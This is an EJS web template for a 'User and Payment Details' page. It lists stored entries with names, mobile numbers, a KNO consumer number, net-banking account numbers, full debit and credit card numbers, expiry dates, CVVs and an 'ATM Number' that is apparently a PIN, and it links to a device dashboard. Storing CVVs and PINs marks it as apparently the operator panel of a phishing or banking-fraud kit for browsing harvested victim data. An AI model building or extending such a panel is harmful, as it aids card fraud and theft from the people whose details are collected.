<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User and Payment Details</title>
  <link rel="stylesheet" href="/css/userDetail.css" />
</head>
<body>
  <!-- Header Navigation -->
  <header class="header-nav">
    <h1>User and Payment Details</h1>
  </header>

  <!-- Main Content Container -->
  <div class="user-detail-container">

    <!-- User Details Section -->
    <h2>User Details</h2>
    <% if (user && user.length > 0) { %>
      <% user.forEach((userDoc, docIndex) => { %>
        <% if (userDoc.entries && userDoc.entries.length > 0) { %>
          <% userDoc.entries.forEach((entry, entryIndex) => { %>
            <div class="card">
              <h3>User Information - <%= entryIndex + 1 %></h3>
              <p><strong>Name:</strong> <%= entry.name %></p>
              <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
             <p><strong>Mobile Number:</strong> <%= entry.knoNumber %></p>
              <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
            </div>
          <% }); %>
        <% } else { %>
          <p>No user entries found in document <%= docIndex + 1 %></p>
        <% } %>
      <% }); %>
    <% } else { %>
      <p>No User Data Found</p>
    <% } %>

    <!-- NetBanking Details Section -->
    <h2>Net Banking Details</h2>
    <% if (netBanking && netBanking.length > 0) { %>
      <% netBanking.forEach((bank, bankIndex) => { %>
        <div class="card">
          <h3>Net Banking Entry - <%= bankIndex + 1 %></h3>
          <% bank.entries.forEach((entry, index) => { %>
            <div class="sub-card">
              <h4>Transaction <%= index + 1 %></h4>
              <p><strong>Bank Name:</strong> <%= entry.bankName %></p>
              <p><strong>Account Number:</strong> <%= entry.accountNumber %></p>
              <p><strong>Transaction Amount:</strong> â‚¹<%= entry.amount %></p>
              <p><strong>Transaction Date:</strong> <%= new Date(entry.transactionDate).toLocaleString() %></p>
            </div>
          <% }); %>
        </div>
      <% }); %>
    <% } else { %>
      <p>No Net Banking Data Found</p>
    <% } %>

    <!-- Debit Card Details -->
    <h2>Debit Card Details</h2>
    <% if (debitCards && debitCards.length > 0) { %>
      <% debitCards.forEach((debitCard, debitIndex) => { %>
        <div class="card">
          <h3>Debit Card Entry - <%= debitIndex + 1 %></h3>
          <% debitCard.entries.forEach((entry, index) => { %>
            <div class="sub-card">
              <h4>Card <%= index + 1 %></h4>
              <p><strong>Card Number:</strong> <%= entry.cardNumber %></p>
              <p><strong>Expiry:</strong> <%= entry.expiry %></p>
              <p><strong>ATM Number:</strong> <%= entry.atmNo %></p>
              <p><strong>CVV:</strong> <%= entry.cvv %></p>
              <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
            </div>
          <% }); %>
        </div>
      <% }); %>
    <% } else { %>
      <p>No Debit Card Data Found</p>
    <% } %>

    <!-- Credit Card Details -->
    <h2>Credit Card Details</h2>
    <% if (creditCards && creditCards.length > 0) { %>
      <% creditCards.forEach((creditCard, creditIndex) => { %>
        <div class="card">
          <h3>Credit Card Entry - <%= creditIndex + 1 %></h3>
          <% creditCard.entries.forEach((entry, index) => { %>
            <div class="sub-card">
              <h4>Card <%= index + 1 %></h4>
              <p><strong>Card Number:</strong> <%= entry.cardNumber %></p>
              <p><strong>Expiry:</strong> <%= entry.expiry %></p>
              <p><strong>CVV:</strong> <%= entry.cvv %></p>
              <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
            </div>
          <% }); %>
        </div>
      <% }); %>
    <% } else { %>
      <p>No Credit Card Data Found</p>
    <% } %>

    <!-- Back to Dashboard Button -->
    <a href="/api/device/dashboard">
      <button class="dashboard-btn">Go to Dashboard</button>
    </a>
  </div>
</body>
</html>
